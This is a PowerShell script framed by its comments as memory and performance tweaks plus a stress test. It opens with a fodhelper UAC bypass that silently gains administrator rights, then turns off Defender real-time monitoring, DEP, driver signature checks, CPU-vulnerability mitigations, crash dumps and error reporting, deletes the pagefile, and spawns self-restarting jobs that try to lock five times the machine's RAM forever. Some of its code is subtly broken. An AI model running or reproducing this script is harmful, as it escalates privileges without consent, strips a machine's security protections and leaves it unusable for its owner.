if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# --- Critical Memory Tweaks ---
# Enable lock memory privilege for large pages
$signature = @"
using System;
using System.Runtime.InteropServices;

public class MemLock {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualLock(IntPtr lpAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPriv, ref TokPriv1Luid NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

    [DllImport("kernel32.dll")]
    public static extern bool SetProcessWorkingSetSizeEx(IntPtr hProcess, IntPtr dwMinimumWorkingSetSize, IntPtr dwMaximumWorkingSetSize, uint Flags);
    
    [DllImport("ntdll.dll")]
    public static extern int NtSetSystemInformation(int InfoClass, IntPtr Info, int Length);
    
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TokPriv1Luid {
        public int Count;
        public LUID Luid;
        public int Attributes;
    }

    public const int SystemMemoryQuotaInformation = 0x25;
    public const int QUOTA_LIMITS_HARDWS_MIN_ENABLE = 0x00000002;
    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_QUERY = 0x00000008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";
}
"@
Add-Type -TypeDefinition $signature

# Become critical process
# [MemLock]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

# Enable SeLockMemoryPrivilege
$tokenHandle = [IntPtr]::Zero
[MemLock]::OpenProcessToken((Get-Process -Id $PID).Handle, [MemLock]::TOKEN_ADJUST_PRIVILEGES -bor [MemLock]::TOKEN_QUERY, [ref]$tokenHandle) | Out-Null

$luid = New-Object MemLock+LUID
[MemLock]::LookupPrivilegeValue($null, [MemLock]::SE_LOCK_MEMORY_NAME, [ref]$luid) | Out-Null

$tp = New-Object MemLock+TokPriv1Luid
$tp.Count = 1
$tp.Luid = $luid
$tp.Attributes = [MemLock]::SE_PRIVILEGE_ENABLED

[MemLock]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null

# --- Pagefile Removal with Force ---
# Disable paging entirely
[MemLock]::RtlAdjustPrivilege(19, $true, $false, [ref]$false) | Out-Null  # SeLockMemoryPrivilege
$hProcess = (Get-Process -Id $PID).Handle
$minMemory = [convert]::ToInt64((Get-WmiObject -Class Win32_OperatingSystem).TotalVirtualMemorySize)
[MemLock]::SetProcessWorkingSetSizeEx($hProcess, [System.IntPtr]$minMemory, [IntPtr]::Zero, [MemLock]::QUOTA_LIMITS_HARDWS_MIN_ENABLE) | Out-Null
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
# Invoke-Expression "bcdedit /set nointegritychecks yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Invoke-Expression "powercfg /hibernate off"
Invoke-Expression "bcdedit /set nx AlwaysOff"
# Invoke-Expression "bcdedit /set testsigning on"
# Disable crash dumps
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "LargeSystemCache" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "HeapDeCommitFreeBlockThreshold" -Value 0x00040000 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 26 -Force
# Disable memory protections
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverride" -Value 3 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "FeatureSettingsOverrideMask" -Value 3 -Force
# Power settings
# Get all available power plans
$powerPlans = powercfg /list
$highPerformancePlan = $powerPlans | Select-String -Pattern "High Performance"
$guid = ($highPerformancePlan -split '\s+')[3]
if ($guid) {
    powercfg /setactive $guid
    Write-Host "High Performance plan activated."
}
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\bc5038f7-23e0-4960-96da-33abaf5935ec" -Name "Attributes" -Value 0 -Force  # Disable power throttling

# Disable memory compression
Disable-MMAgent -MemoryCompression
# Disable prefetch
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force
# Disable antivirus interface
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
# Kill Windows Error Reporting
Stop-Service "WerSvc" -Force
Set-Service "WerSvc" -StartupType Disabled

Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
Install-Module -Name PowerShellGet -Force -AllowClobber -Confirm:$false
Install-Module -Name PackageManagement -Force -AllowClobber -Confirm:$false
Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber -Confirm:$false 
Import-Module ThreadJob -Force

# --- Memory Allocation Parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum
$targetMem = [math]::Floor($physicalMem * 5)  # 500% of RAM
$chunkSize = 4*1024*1024*1024  # Large page size
$jobs = [System.Collections.ArrayList]::new()

# --- Kernel-Level Memory Allocation Function ---
$memHogScript = {
    param($chunkSize, $targetMem)

    $memBlocks = [System.Collections.Generic.List[IntPtr]]::new()
    $allocated = 0
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $MEM_LARGE_PAGES = 0x20000000
    $PAGE_READWRITE = 0x04

    while ($allocated -lt $targetMem) {
        $ptr = [MemLock]::VirtualAlloc([IntPtr]::Zero, $chunkSize, $MEM_COMMIT -bor $MEM_RESERVE -bor $MEM_LARGE_PAGES, $PAGE_READWRITE)  # MEM_COMMIT | MEM_RESERVE | MEM_LARGE_PAGES
        if ($ptr -eq [IntPtr]::Zero) {
            $chunkSize = [math]::Max($chunkSize / 2, 512MB)
            continue
        }
        
        try{
            if (-not ([MemLock]::VirtualLock($alloc, [UIntPtr][uint64]$chunkSize))) {
                throw "VirtualLock failed"
            }
            # Touch memory to force physical allocation
            # [System.Runtime.InteropServices.Marshal]::WriteInt64($ptr, [DateTime]::Now.Ticks)
            $pageSize = 4096
            $buffer4K = New-Object byte[] $pageSize
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($buffer4K)
            for ($i = 0; $i -lt $chunkSize; $i += $pageSize) {
                # Write 4KB buffer to each page
                [System.Runtime.InteropServices.Marshal]::Copy($buffer4K, 0, $ptr + $i, $pageSize)
            }
            $chunk = New-Object byte[] $chunkSize
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
            $memBlocks.Add($ptr)
            $allocated += $chunkSize
        }
        catch{
            if ($_ -is [System.OutOfMemoryException]) {
                Write-Warning "Out of memory at $chunkSize bytes. Continuing with smaller chunk size."
                $chunkSize = [math]::Max($chunkSize / 2, 512MB)  # Reduce chunk size to avoid hitting memory limits
                continue
            }
            else {
                Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
            }
        }
    }    

    # Hold memory indefinitely
    while ($true) { 
        foreach ($block in $memBlocks) {
            [System.Runtime.InteropServices.Marshal]::ReadInt64($block) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt64($block, [DateTime]::Now.Ticks)
        }
        # [GC]::Collect()
        # [GC]::WaitForPendingFinalizers()
        # Start-Sleep -Seconds 5 
    }
}

# --- Launch Memory Hogs ---
function Start-StressJob {
    param($index)
    $job = Start-Job -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
    $job | Add-Member -NotePropertyName Retries -NotePropertyValue 0
    $jobs.Add($job)
}

# Start stress jobs for each CPU core
1..(([Environment]::ProcessorCount)*3) | ForEach-Object {
    Start-StressJob -index $i
}

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# --- Monitoring with Minimal CPU Impact ---
while ($true) {
    $currentJobs = @($jobs.ToArray())
    $currentJobs | Where-Object { $_.State -ne 'Running' } | ForEach-Object {
        $newJob = Start-ThreadJob -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
        $newJob | Add-Member -NotePropertyName Retries -NotePropertyValue ($_.Retries + 1)
        $jobs.Remove($_)
        $jobs.Add($newJob)
    }
    Start-Sleep -Seconds 10  # Reduced monitoring frequency
}
